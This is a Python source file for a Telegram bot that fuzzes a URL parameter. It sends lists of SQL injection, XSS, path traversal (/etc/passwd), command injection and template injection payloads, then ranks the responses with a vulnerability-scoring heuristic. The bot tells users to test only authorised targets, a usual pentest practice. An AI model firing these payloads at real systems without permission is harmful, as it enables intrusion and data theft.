import asyncio
from typing import List, Tuple

import aiohttp
from telegram import Update
from telegram.ext import ContextTypes


TIMEOUT = 8
MAX_SIMPLE_PAYLOADS = 25      # для /fuzz
MAX_SMART_RESULTS = 12        # сколько самых интересных показывать в /fuzzplus


# --- Наборы payload'ов --- #

SIMPLE_PAYLOADS = [
    "1", "10", "-1", "0", "9999", "abc", "../", "../../etc/passwd",
    "' OR '1'='1", "\" OR \"1\"=\"1", "';--", "\";--",
    "<script>alert(1)</script>",
    "%27%20OR%201=1--",
    "../../..//etc/passwd",
    "../../../../windows/win.ini",
    "`id`", "$(id)", "| id", "; id",
    "' AND SLEEP(3)--", "\" AND SLEEP(3)--",
    "{{7*7}}", "${7*7}", "#{7*7}",
    "%3Cscript%3Ealert(1)%3C/script%3E"
]

SMART_PAYLOADS = [
    # SQLi / error-based
    "'", "\"", "'))", "1' OR '1'='1", "\" OR \"1\"=\"1", "' OR 1=1--",
    "1 OR 1=1", "1' AND SLEEP(3)--", "\" AND SLEEP(3)--",
    "1);WAITFOR DELAY '0:0:3'--",
    "' UNION SELECT NULL--", "' UNION ALL SELECT NULL,NULL--",
    "' UNION SELECT @@version--",

    # XSS
    "<script>alert(1)</script>",
    "\" autofocus onfocus=alert(1) x=\"",
    "'><svg/onload=alert(1)>",
    "<img src=x onerror=alert(1)>",
    "javascript:alert(1)",

    # LFI / Path traversal
    "../../etc/passwd",
    "../../../../etc/passwd",
    "..\\..\\windows\\win.ini",
    "/etc/passwd",
    "C:\\windows\\win.ini",

    # Command injection
    ";id", "&& id", "| id", "`id`",
    "&& sleep 5", "; sleep 5",

    # SSTI
    "{{7*7}}", "${7*7}", "#{7*7}", "<%= 7*7 %>", "${{7*7}}",

    # Generic fuzz
    "../../../", "../../../../../../",
    "%00", "%0a", "%0d%0a", "%ff",
    "' OR 'x'='x", "\" OR \"x\"=\"x",
    "' AND '1'='2", "\" AND \"1\"=\"2",

    # WAF / странные штуки
    "/*'*/OR/*'*/1=1--",
    "' /*!50000union*/ select 1,2--",
    "admin'--",
    "admin' #",
    "admin' /*",

    # JSON / API style
    "null", "true", "false", "[]", "{}", "{\"test\":\"test\"}",

    # ещё немного странных строк
    "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa",
    "' OR SLEEP(3)#",
    "\" OR SLEEP(3)#",
    "FUZZFUZZFUZZ",
]


def _replace_fuzz(url: str, payload: str) -> str:
    return url.replace("FUZZ", payload)


async def _fetch(session: aiohttp.ClientSession, url: str) -> Tuple[int, int, str]:
    """
    Возвращает (status, length, body_snippet)
    """
    try:
        async with session.get(url, timeout=TIMEOUT, allow_redirects=True) as resp:
            text = await resp.text(errors="ignore")
            return resp.status, len(text), text[:4000]
    except Exception as e:
        # для таймаутов/ошибок
        return 0, 0, f"__error__:{repr(e)}"


def _score_response(
    status: int, length: int, baseline_len: int, body: str
) -> int:
    """
    Примитивная эвристика: чем выше score, тем интереснее ответ.
    """
    score = 0

    # необычные статусы
    if status >= 500:
        score += 4
    elif status == 403:
        score += 3
    elif status in (401, 402):
        score += 2
    elif status in (301, 302, 307, 308):
        score += 1

    # сильное отличие длины от базовой
    if baseline_len > 0:
        diff = abs(length - baseline_len)
        if diff > baseline_len * 0.7:
            score += 2
        elif diff > baseline_len * 0.4:
            score += 1

    low = body.lower()

    # явные ошибки
    keywords = [
        "sql syntax", "mysql", "psql", "postgresql", "odbc",
        "exception", "traceback", "warning:", "stack trace",
        "fatal error", "undefined index", "undefined variable",
        "notice:", "division by zero",
    ]
    for kw in keywords:
        if kw in low:
            score += 3
            break

    # возможно XSS
    if "<script>alert(" in low:
        score += 4

    return score


async def fuzz_command(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    """
    Лёгкий режим /fuzz:
    - ~25 payload'ов
    - показывает только статистику и несколько интересных находок.
    """
    if not context.args:
        await update.message.reply_text(
            "Нужно указать URL с плейсхолдером FUZZ.\n\n"
            "Пример:\n"
            "/fuzz https://testphp.vulnweb.com/listproducts.php?cat=FUZZ"
        )
        return

    url = context.args[0].strip()

    if "FUZZ" not in url:
        await update.message.reply_text(
            "В URL должен быть плейсхолдер 'FUZZ'.\n\n"
            "Пример:\n"
            "/fuzz https://testphp.vulnweb.com/listproducts.php?cat=FUZZ"
        )
        return

    await update.message.reply_text(
        f"🪓 Fuzzer для:\n{url}\n\n"
        "Подставляю payload'ы и ищу интересные ответы…\n"
        "Используй только на целях, где у тебя есть разрешение!"
    )

    tested = 0
    interesting: List[str] = []

    async with aiohttp.ClientSession() as session:
        # базовый запрос
        baseline_url = _replace_fuzz(url, "kimura_test")
        base_status, base_len, base_body = await _fetch(session, baseline_url)
        baseline_len = base_len

        for payload in SIMPLE_PAYLOADS[:MAX_SIMPLE_PAYLOADS]:
            tested += 1
            fuzzed_url = _replace_fuzz(url, payload)
            status, length, body = await _fetch(session, fuzzed_url)
            score = _score_response(status, length, baseline_len, body)

            if score >= 3:
                line = (
                    f"- [{status}] {fuzzed_url}\n"
                    f"  score={score}, len={length}\n"
                )
                interesting.append(line)

    if not interesting:
        text = (
            f"Проверено payload'ов: {tested}\n"
            "Я не нашёл явно интересных ответов.\n"
            "Но всё равно стоит посмотреть вручную."
        )
        await update.message.reply_text(text)
        return

    header = (
        f"Проверено payload'ов: {tested}\n"
        f"Ниже несколько самых интересных ответов:\n\n"
    )

    body = "".join(interesting[:10])
    await update.message.reply_text(header + body)


async def fuzzplus_command(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    """
    Умный режим /fuzzplus:
    - большой набор payload'ов
    - считает score и показывает только самые интересные ответы.
    """
    if not context.args:
        await update.message.reply_text(
            "Нужно указать URL с плейсхолдером FUZZ.\n\n"
            "Пример:\n"
            "/fuzzplus https://testphp.vulnweb.com/listproducts.php?cat=FUZZ"
        )
        return

    url = context.args[0].strip()

    if "FUZZ" not in url:
        await update.message.reply_text(
            "В URL должен быть плейсхолдер 'FUZZ'.\n\n"
            "Пример:\n"
            "/fuzzplus https://testphp.vulnweb.com/listproducts.php?cat=FUZZ"
        )
        return

    await update.message.reply_text(
        f"🧠 FUZZER+ (умный режим) для:\n{url}\n\n"
        "Подставляю расширенный набор payload'ов и ищу самые подозрительные ответы…\n"
        "Используй только на целях, где у тебя есть разрешение!"
    )

    results: List[Tuple[int, str, int, int]] = []  # (score, url, status, length)
    tested = 0

    async with aiohttp.ClientSession() as session:
        # базовый запрос
        baseline_url = _replace_fuzz(url, "kimura_test")
        base_status, base_len, base_body = await _fetch(session, baseline_url)
        baseline_len = base_len

        # чтобы не положить цель — делаем по 20 запросов одновременно
        chunk_size = 20
        payloads = SMART_PAYLOADS

        for i in range(0, len(payloads), chunk_size):
            chunk = payloads[i:i + chunk_size]
            tasks = []

            for p in chunk:
                fuzzed_url = _replace_fuzz(url, p)
                tasks.append(_fetch(session, fuzzed_url))

            responses = await asyncio.gather(*tasks)
            for p, (status, length, body) in zip(chunk, responses):
                tested += 1
                score = _score_response(status, length, baseline_len, body)
                if score >= 3:
                    fuzzed_url = _replace_fuzz(url, p)
                    results.append((score, fuzzed_url, status, length))

    if not results:
        text = (
            f"Проверено payload'ов: {tested}\n"
            "FUZZER+ не нашёл явно интересных ответов по своим эвристикам.\n"
            "Но всё равно стоит прогнать ручной анализ /burp и свои скрипты."
        )
        await update.message.reply_text(text)
        return

    # сортировка по score и длине
    results.sort(key=lambda x: (-x[0], x[3]))

    header = (
        f"🔥 FUZZER+ отчёт:\n"
        f"Проверено payload'ов: {tested}\n"
        f"Показаны самые подозрительные ответы (по убыванию важности):\n\n"
    )

    lines = [header]
    for idx, (score, u, status, length) in enumerate(results[:MAX_SMART_RESULTS], start=1):
        lines.append(
            f"{idx}. [score={score}] [{status}] {u}\n"
            f"   len={length}\n"
        )

    lines.append(
        "\nНапоминание: используй результаты только в рамках легального pentest/bug bounty.\n"
        "Дальше можно более детально проверять эти URL в Burp, ffuf, kxss, nuclei и своими скриптами."
    )

    text = "".join(lines)
    # режем на куски, если вдруг будет слишком длинно
    chunk_size = 3500
    for i in range(0, len(text), chunk_size):
        await update.message.reply_text(text[i:i + chunk_size])
